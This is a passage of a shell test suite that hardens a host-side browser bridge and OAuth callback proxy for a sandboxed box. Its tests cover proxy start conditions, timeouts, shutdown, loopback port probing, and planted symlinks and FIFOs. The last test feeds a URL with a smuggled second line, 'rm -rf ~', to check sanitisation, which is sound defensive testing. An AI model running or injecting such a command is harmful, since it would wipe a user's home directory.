  # the destination gate would refuse the proxy first and this test would pass
  # without the is_auth gate existing at all, which is a guard another guard
  # covers and therefore one no mutation can reach. github.com is on the shipped
  # list and carries no redirect_uri, so only is_auth stops the bind.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _extract_callback_port() { echo "5555"; return 0; }
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
  _port_in_use() { return 1; }
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://github.com/cleatdev/cleat" > "$dir/.browser-open"
  sleep 2
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ ! -f "$TEST_TEMP/proxy_started" ] || { echo "a deferred plain link bound a host port"; return 1; }
}

@test "callback proxy: a real authorize URL still starts the proxy" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _extract_callback_port() { echo "5555"; return 0; }
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
  _browser_watcher "$dir" "true" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A5555%2Fcb" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/proxy_started" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/proxy_started" ] || { echo "a loopback authorize URL did not start the proxy"; return 1; }
}

# ── Callback proxy lifetime ──────────────────────────────────────────────────

@test "callback proxy: a TERM takes the backend down and frees the port" {
  # The backend used to run in the FOREGROUND of the proxy subshell, so bash
  # deferred the trap until it exited: an abandoned login kept the loopback
  # port bound past session end and the watcher's own wait never returned.
  mkdir -p "$TEST_TEMP/bin"
  cat > "$TEST_TEMP/bin/socat" <<EOF
#!/usr/bin/env bash
echo "\$\$" > "$TEST_TEMP/socat.pid"
exec sleep 30
EOF
  chmod +x "$TEST_TEMP/bin/socat"
  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45999 mybox "$TEST_TEMP/plog" &
  local ppid=$!
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -s "$TEST_TEMP/socat.pid" ] && break
    sleep 0.3
  done
  [ -s "$TEST_TEMP/socat.pid" ] || { echo "fake backend never started"; kill "$ppid" 2>/dev/null; return 1; }
  local spid; spid="$(cat "$TEST_TEMP/socat.pid")"
  kill -TERM "$ppid" 2>/dev/null || true
  process_exited "$ppid" || { echo "proxy subshell survived TERM"; kill -9 "$ppid" 2>/dev/null; return 1; }
  process_exited "$spid" || { echo "backend was orphaned and still holds the port"; kill -9 "$spid" 2>/dev/null; return 1; }
}

# ── Stale-bridge sweep (shared by startup and every teardown) ────────────────

@test "bridge sweep: removes a stale bridge file" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf '%s' "https://example.com/old" > "$dir/.browser-open"
  touch -t 202001010000 "$dir/.browser-open"
  _browser_sweep_stale_bridge "$dir"
  [ ! -e "$dir/.browser-open" ] || { echo "a stale bridge file survived the sweep"; return 1; }
}

@test "bridge sweep: keeps a fresh bridge file for a sibling session" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  _browser_sweep_stale_bridge "$dir"
  [ -f "$dir/.browser-open" ] || { echo "the sweep swallowed a live sibling login URL"; return 1; }
}

@test "bridge sweep: removes a symlink regardless of age" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf 'keep\n' > "$TEST_TEMP/sweep-target"
  ln -s "$TEST_TEMP/sweep-target" "$dir/.browser-open"
  _browser_sweep_stale_bridge "$dir"
  [ ! -L "$dir/.browser-open" ] || { echo "a planted symlink survived the sweep"; return 1; }
  [ -f "$TEST_TEMP/sweep-target" ] || { echo "the sweep followed the link and removed the target"; return 1; }
}

@test "proxy log: a real log is never dropped, only a symlink is" {
  # Guards against an overbroad fix. Only a SYMLINK may be removed and only an
  # OVERSIZED log capped, so a regular log must survive BOTH watcher start and
  # a claimed URL, carrying its history forward.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf 'prior session line\n' > "$dir/.proxy-log"
  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://x.example/a" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    grep -q 'opening URL' "$dir/.proxy-log" 2>/dev/null && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  run cat "$dir/.proxy-log"
  assert_output --partial "prior session line"
  assert_output --partial "opening URL"
}

@test "callback proxy: a TERM takes the python backend down too" {
  # The python3 branch is backgrounded and waited on exactly like socat. Only
  # the socat branch was pinned, so the python half could regress unseen.
  mkdir -p "$TEST_TEMP/nosocat5"
  local b
  for b in bash date cat sleep; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat5/$b"; done
  cat > "$TEST_TEMP/nosocat5/python3" <<EOF
#!/usr/bin/env bash
cat > /dev/null
echo "\$\$" > "$TEST_TEMP/py.pid"
exec sleep 30
EOF
  chmod +x "$TEST_TEMP/nosocat5/python3"
  PATH="$TEST_TEMP/nosocat5" _auth_callback_proxy 45998 mybox "$TEST_TEMP/plog6" &
  local ppid=$!
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -s "$TEST_TEMP/py.pid" ] && break
    sleep 0.3
  done
  [ -s "$TEST_TEMP/py.pid" ] || { kill "$ppid" 2>/dev/null; echo "fake python backend never started"; return 1; }
  local pypid; pypid="$(cat "$TEST_TEMP/py.pid")"
  kill -TERM "$ppid" 2>/dev/null || true
  process_exited "$ppid" || { echo "proxy subshell survived TERM"; kill -9 "$ppid" 2>/dev/null; return 1; }
  process_exited "$pypid" || { echo "python backend was orphaned"; kill -9 "$pypid" 2>/dev/null; return 1; }
}

# ── Callback proxy readiness ─────────────────────────────────────────────────
# The watcher opens nothing until the backend writes the ready file, so a
# backend that stops writing it ends every hands-free login. Every watcher test
# stubs the proxy to touch the file itself, which is why these two drive the
# real backends. Neither connects to the port: TCP-LISTEN without fork accepts
# a single connection, and that one belongs to the login. The wait is the
# watcher's own, 20 polls of 0.1s.

@test "callback proxy: the socat backend signals readiness once listening" {
  mkdir -p "$TEST_TEMP/bin"
  cat > "$TEST_TEMP/bin/socat" <<EOF
#!/usr/bin/env bash
echo "\$\$" > "$TEST_TEMP/socat.pid"
exec sleep 30
EOF
  chmod +x "$TEST_TEMP/bin/socat"
  local rf="$TEST_TEMP/ready-socat"
  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45311 mybox "$TEST_TEMP/plog-rs" "$rf" 3>&- &
  local ppid=$! i=0
  while [ "$i" -lt 20 ]; do
    [ -f "$rf" ] && break
    sleep 0.1
    i=$(( i + 1 ))
  done
  local ready=0; [ -f "$rf" ] && ready=1
  kill -TERM "$ppid" 2>/dev/null || true
  process_exited "$ppid" || kill -9 "$ppid" 2>/dev/null || true
  if [ -s "$TEST_TEMP/socat.pid" ]; then
    process_exited "$(cat "$TEST_TEMP/socat.pid")" || kill -9 "$(cat "$TEST_TEMP/socat.pid")" 2>/dev/null || true
  fi
  [ "$ready" = 1 ] || { echo "the socat backend never wrote the readiness file, so the watcher would open nothing"; return 1; }
}

@test "callback proxy: the python backend signals readiness after a real bind" {
  command -v python3 >/dev/null 2>&1 || skip "python3 is not on this host"
  local farm="$TEST_TEMP/nosocat-ready"
  _bb_tool_farm "$farm" bash date cat sleep seq python3
  local port
  port="$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1]); s.close()')"
  local rf="$TEST_TEMP/ready-python"
  PATH="$farm" _auth_callback_proxy "$port" mybox "$TEST_TEMP/plog-rp" "$rf" 3>&- &
  local ppid=$! i=0
  while [ "$i" -lt 20 ]; do
    [ -f "$rf" ] && break
    sleep 0.1
    i=$(( i + 1 ))
  done
  local ready=0; [ -f "$rf" ] && ready=1
  kill -TERM "$ppid" 2>/dev/null || true
  process_exited "$ppid" || kill -9 "$ppid" 2>/dev/null || true
  [ "$ready" = 1 ] || { echo "the python backend never wrote the readiness file, so the watcher would open nothing"; return 1; }
}

# ── Hosts with no timeout(1), and both loopbacks ─────────────────────────────

# A PATH holding only the named tools, so a test can take timeout(1) away the
# way a stock macOS does. Anything a test needs by name must be listed.
_bb_tool_farm() {
  local farm="$1" t p; shift
  mkdir -p "$farm"
  for t in "$@"; do
    p="$(command -v "$t" 2>/dev/null)" || continue
    ln -sf "$p" "$farm/$t"
  done
}

# A listener on one loopback, $1 = 4 or 6, that never accepts. It writes its
# port to $2 once bound, or creates $2.nobind when that loopback does not exist.
# fd 3 is closed so a straggler cannot hold bats open.
_bb_loopback_listener() {
  python3 - "$1" "$2" 3>&- <<'PY' &
import os, socket, sys, time
fam, out = sys.argv[1], sys.argv[2]
try:
    if fam == "6":
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
        s.bind(("::1", 0))
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))
    s.listen(8)
except OSError:
    open(out + ".nobind", "w").close()
    sys.exit(0)
with open(out + ".tmp", "w") as f:
    f.write(str(s.getsockname()[1]))
os.rename(out + ".tmp", out)
time.sleep(60)
PY
}

@test "callback proxy: the socat wait stays bounded on a host with no timeout(1)" {
  # A stock macOS ships no timeout(1), and the bound was written as
  # `command -v timeout && ...`, so there the port the box named stayed bound
  # until a connection came. perl's alarm is the fallback. The wait is 1s here
  # and the stand-in socat never exits, so only the bound can end it.
  local farm="$TEST_TEMP/notimeout"
  _bb_tool_farm "$farm" bash date cat sleep seq perl
  [ -x "$farm/perl" ] || skip "perl is not on this host"
  cat > "$farm/socat" <<EOF
#!$(command -v bash)
echo "\$\$" > "$TEST_TEMP/socat.pid"
exec sleep 30
EOF
  chmod +x "$farm/socat"
  _ACP_WAIT_SECS=1
  PATH="$farm" _auth_callback_proxy 45997 mybox "$TEST_TEMP/plog7" &
  local ppid=$! i ended=0
  for i in $(seq 1 40); do
    kill -0 "$ppid" 2>/dev/null || { ended=1; break; }
    sleep 0.25
  done
  if [ "$ended" = 0 ]; then
    kill -TERM "$ppid" 2>/dev/null || true
    process_exited "$ppid" || kill -9 "$ppid" 2>/dev/null || true
    echo "the socat wait outlived its bound on a host with no timeout(1)"
    return 1
  fi
  wait "$ppid" 2>/dev/null || true
  [ -s "$TEST_TEMP/socat.pid" ] || { echo "the stand-in socat never started"; return 1; }
  process_exited "$(cat "$TEST_TEMP/socat.pid")" || { echo "socat outlived the proxy"; return 1; }
}

@test "callback proxy: the python backend waits the same _ACP_WAIT_SECS as socat" {
  # One value both backends read. The python leg had its own 300 written into
  # the heredoc, so the two could drift apart without a test noticing.
  command -v python3 >/dev/null 2>&1 || skip "python3 is not on this host"
  local farm="$TEST_TEMP/nosocat7"
  _bb_tool_farm "$farm" bash date cat sleep python3
  local port
  port="$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1]); s.close()')"
  _ACP_WAIT_SECS=1
  PATH="$farm" _auth_callback_proxy "$port" mybox "$TEST_TEMP/plog8" 3>&- &
  local ppid=$! i ended=0
  for i in $(seq 1 40); do
    kill -0 "$ppid" 2>/dev/null || { ended=1; break; }
    sleep 0.25
  done
  if [ "$ended" = 0 ]; then
    kill -TERM "$ppid" 2>/dev/null || true
    process_exited "$ppid" || kill -9 "$ppid" 2>/dev/null || true
    echo "the python backend ignored _ACP_WAIT_SECS"
    return 1
  fi
  run cat "$TEST_TEMP/plog8"
  assert_output --partial "timeout waiting for callback (1s)"
}

@test "callback proxy: the socat wait is bounded at 300 seconds" {
  # The value, not only the wiring. The tests above shrink the wait to 1s to
  # watch it end, so nothing pinned how long a real login holds the port the box
  # named. A stand-in timeout(1) records the bound it is handed, and a socat
  # that exits at once ends the proxy without a wait.
  mkdir -p "$TEST_TEMP/bin300"
  cat > "$TEST_TEMP/bin300/timeout" <<EOF
#!/usr/bin/env bash
printf '%s\n' "\$1" >> "$TEST_TEMP/timeout.args"
shift
exec "\$@"
EOF
  cat > "$TEST_TEMP/bin300/socat" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
  chmod +x "$TEST_TEMP/bin300/timeout" "$TEST_TEMP/bin300/socat"
  ( PATH="$TEST_TEMP/bin300:$PATH"; _auth_callback_proxy 45995 mybox "$TEST_TEMP/plog300" ) 3>&-
  run cat "$TEST_TEMP/timeout.args"
  assert_output "300"
}

@test "_port_in_use: a service on 127.0.0.1 holds the port, and the port is free once it goes" {
  command -v python3 >/dev/null 2>&1 || skip "python3 is not on this host"
  local out="$TEST_TEMP/lport4"
  _bb_loopback_listener 4 "$out"
  local lpid=$! i
  for i in $(seq 1 40); do
    [ -s "$out" ] || [ -e "$out.nobind" ] && break
    sleep 0.1
  done
  [ -s "$out" ] || { kill "$lpid" 2>/dev/null; echo "the IPv4 listener never bound"; return 1; }
  local port; port="$(cat "$out")"
  run _port_in_use "$port"
  kill "$lpid" 2>/dev/null || true
  process_exited "$lpid" || kill -9 "$lpid" 2>/dev/null || true
  wait "$lpid" 2>/dev/null || true
  assert_success
  run _port_in_use "$port"
  assert_failure
}

@test "_port_in_use: a service on [::1] alone holds the port too" {
  # The proxy binds 127.0.0.1, so an IPv6-only host service does not stop the
  # bind. The browser then resolves localhost to ::1 first and lands on THAT
  # service with the host's cookies. Probing 127.0.0.1 alone called it free.
  # Covered on Linux here. bash 3.2's /dev/tcp with an IPv6 literal is proven
  # only by the macOS CI leg.
  command -v python3 >/dev/null 2>&1 || skip "python3 is not on this host"
  local out="$TEST_TEMP/lport6"
  _bb_loopback_listener 6 "$out"
  local lpid=$! i
  for i in $(seq 1 40); do
    [ -s "$out" ] || [ -e "$out.nobind" ] && break
    sleep 0.1
  done
  if [ -e "$out.nobind" ]; then
    wait "$lpid" 2>/dev/null || true
    skip "this host has no IPv6 loopback"
  fi
  [ -s "$out" ] || { kill "$lpid" 2>/dev/null; echo "the IPv6 listener never bound"; return 1; }
  run _port_in_use "$(cat "$out")"
  kill "$lpid" 2>/dev/null || true
  process_exited "$lpid" || kill -9 "$lpid" 2>/dev/null || true
  wait "$lpid" 2>/dev/null || true
  assert_success
}

@test "proxy log: a FIFO planted mid-session is dropped and the watcher keeps running" {
  # A FIFO passes both [ -L ] and [ -f ] as false, and `>>` on it blocks until
  # a reader appears, so a box could hang the watcher, and with it teardown.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  rm -f "$dir/.proxy-log"; mkfifo "$dir/.proxy-log"
  printf '%s' "https://x.example/a" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$dir/.proxy-log" ] && [ ! -p "$dir/.proxy-log" ] && break
    sleep 0.5
  done
  local alive=0; kill -0 "$wpid" 2>/dev/null && alive=1
  kill "$wpid" 2>/dev/null || true
  process_exited "$wpid" || kill -9 "$wpid" 2>/dev/null || true
  [ "$alive" = 1 ] || { echo "watcher died"; return 1; }
  [ ! -p "$dir/.proxy-log" ] || { echo "the FIFO survived, the watcher would have blocked on it"; return 1; }
  run grep -c 'opening URL' "$dir/.proxy-log"
  assert_output "1"
}

@test "browser bridge: the opener never receives a control character" {
  # The log line was sanitised, but the opener still got the raw URL. A URL
  # never legitimately carries a control character, so hand it the clean one.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
printf '%s' "\$1" > "$TEST_TEMP/opened.arg"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf 'https://x.example/a\nrm -rf ~' > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/opened.arg" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.arg" ] || { echo "nothing was opened"; return 1; }
  run wc -l < "$TEST_TEMP/opened.arg"
  [ "$(tr -d '[:space:]' <<< "$output")" = "0" ] || { echo "a newline reached the opener"; return 1; }
}
